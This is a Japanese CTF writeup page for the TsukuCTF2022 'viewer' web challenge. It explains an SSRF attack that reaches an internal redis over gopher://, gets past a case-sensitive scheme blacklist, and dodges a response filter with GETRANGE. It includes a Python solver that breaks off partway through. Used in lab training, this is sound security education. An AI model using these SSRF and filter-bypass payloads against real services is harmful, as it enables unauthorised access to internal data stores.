<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>viewer-TsukuCTF2022</title><meta name="description" content="このサイトはSecHack365修了生よって運営されている非公式ののファンページです。"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="viewer-TsukuCTF2022"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://opengraph.githubassets.com/139256f8ccf77c03f7d9d1b51e30822cb3d14d45abeae53f15384cefc9c7e9da/SecHack365-Fans/SecHack365-Fans.github.io"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/21f8e083f97816c3.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/21f8e083f97816c3.css" crossorigin="" data-n-g=""/><link rel="preload" href="/_next/static/css/1f00fd419dbaebec.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/1f00fd419dbaebec.css" crossorigin="" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-11208a711ab0acff.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-10fac88913917d91.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-3ae351249979994e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-fcb51fc9229d9f20.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/1bfc9850-950c562bd9f4b960.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/749-b2a0386138c3c00e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/212-7f8e90692937549a.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2022/%5Bid%5D-2ababdca92b3a576.js" defer="" crossorigin=""></script><script src="/_next/static/uINUjeO87z5y6TQHO95US/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/uINUjeO87z5y6TQHO95US/_ssgManifest.js" defer="" crossorigin=""></script></head><body><div id="__next"><div><div class="x1aogm5o xvqvw8y xudrmeu x78zum5 x1q0g3np x6s0dn4 xxzecl9"><a class="xnc0nkd x1sivnnp x13bj11h" href="/"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium xrv4cvt x6mezaz x18eybuq xxzecl9 x117nqv4 css-1ujsas3" tabindex="0" type="button">TOP</button></a><a class="xnc0nkd x1sivnnp x13bj11h" href="/blog"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium xrv4cvt x6mezaz x18eybuq x19xzur5 css-1ujsas3" tabindex="0" type="button">参加記</button></a><a class="xnc0nkd x1sivnnp x13bj11h" href="/timer"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium xrv4cvt x6mezaz x18eybuq x19xzur5 css-1ujsas3" tabindex="0" type="button">†締切駆動コース†</button></a><a class="xnc0nkd x1sivnnp x13bj11h" href="/ctf"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium xrv4cvt x6mezaz x18eybuq x19xzur5 css-1ujsas3" tabindex="0" type="button">TsukuCTF</button></a><a class="xnc0nkd x1sivnnp x13bj11h" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium xrv4cvt x6mezaz x18eybuq x19xzur5 css-1ujsas3" tabindex="0" type="button"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></button></a></div><div style="padding:15px"><h1>viewer</h1>
<h2>はじめに</h2>
<p>本問題で配布されたコードの一部に実装不備があり参加者体験を悪くしてしまったことを、CTF 終了後に幾つかのブログ記事やツイートから知りました。この件に関して、万全の問題提供ができなかったことをお詫び申し上げます。</p>
<p>再発防止のために配布されるコードと本番環境のコードに差異を生まないようレビュー段階で注意する予定です。そして、参加者の皆様にとってより良い CTF にするためにも、不審な点などがあれば Discord の#ask-to-admin でご確認いただけると非常にありがたいです。よろしくお願いします。</p>
<p>また、これに伴い簡単なポストモーテムを行ったため Writeup 末尾に追記します。本件に興味がある方はご覧ください。</p>
<h2>問題文</h2>
<p>Writeups for TsukuCTF21 have been published.
Check them out if you&#x27;d like!</p>
<h2>難易度</h2>
<p>Medium</p>
<h2>解法</h2>
<p>配布されているソースコードを読むと、redis の中に FLAG が含まれていることが分かる。<br/>
<!-- -->curl で redis ということは別プロトコルを利用した SSRF が思い浮かぶ。<br/>
<!-- -->Flag が存在している場所は<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">app.py</code> 上か redis 内部であるため、いずれかの情報を抜き取りたい。<br/>
<!-- -->前者は <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">file://</code> scheme、後者は <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">gopher://</code> や<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">dict://</code> scheme を利用することになりそうだ。</p>
<p>しかし、前者は以下の <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">response_sanitizer</code> によってサニタイズされるため、後者を利用することにする。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># app.py</span><span>
</span><span></span><span class="token token" style="color:#999"># a response is also sanitized just in case because the flag is super sensitive information.</span><span>
</span><span>blacklist_in_response </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&#x27;TsukuCTF22&#x27;</span><span class="token token" style="color:#ccc">]</span><span>
</span>
<span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">response_sanitizer</span><span class="token token" style="color:#ccc">(</span><span>body</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">any</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">[</span><span>scheme </span><span class="token token" style="color:#cc99cd">in</span><span> body </span><span class="token token" style="color:#cc99cd">for</span><span> scheme </span><span class="token token" style="color:#cc99cd">in</span><span> blacklist_in_response</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#7ec699">&quot;SANITIZED: a sensitive data is included!&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> body</span></code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">gopher://</code> 等は禁止されているように見えるが、case-insensitive なので大文字を含めることで回避できる。</p>
<p>ただし、gopher で対象の value を取るために、redis の key を知る必要がある。<br/>
<!-- -->key は redis の <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">keys *</code> で全列挙できるため、全ての key を列挙して response に flag が含まれるものを選択すれば良い。</p>
<p>また、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">TsukuCTF22</code>という文字列を含む場合は sanitize されるが、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">GETRANGE</code> で一部を抜き出すことで対処できる。<br/>
<!-- -->したがって、方針は以下の通りになる。<br/>
<!-- -->まず、redis に含まれる key を全列挙し、次に GETRANGE で列挙したものの一部を読み取る。</p>
<p>solver は以下の通り。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">import</span><span> requests
</span><span></span><span class="token token" style="color:#cc99cd">from</span><span> urllib</span><span class="token token" style="color:#ccc">.</span><span>parse </span><span class="token token" style="color:#cc99cd">import</span><span> quote
</span><span></span><span class="token token" style="color:#cc99cd">import</span><span> re
</span><span></span><span class="token token" style="color:#cc99cd">import</span><span> sys
</span>
<span></span><span class="token token" style="color:#999"># CHANGE HERE with an appropriate url</span><span>
</span><span>TARGET_URL </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;http://127.0.0.1:31555&quot;</span><span>
</span>
<span></span><span class="token token" style="color:#999"># enumerate redis keys</span><span>
</span><span>form </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span>    </span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;Gopher://redis:6379/+&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> quote</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;keys *\r\nQUIT\r\n&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span>cookies </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span>    </span><span class="token token" style="color:#7ec699">&quot;__SESSION_ID&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;d8c7d141-b8da-416b-a220-d8d7218c8bbc&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#999"># dummy session id</span><span>
</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span>res </span><span class="token token" style="color:#67cdcc">=</span><span> requests</span><span class="token token" style="color:#ccc">.</span><span>post</span><span class="token token" style="color:#ccc">(</span><span>TARGET_URL</span><span class="token token" style="color:#ccc">,</span><span> data</span><span class="token token" style="color:#67cdcc">=</span><span>form</span><span class="token token" style="color:#ccc">,</span><span> cookies</span><span class="token token" style="color:#67cdcc">=</span><span>cookies</span><span class="token token" style="color:#ccc">)</span><span>
</span>
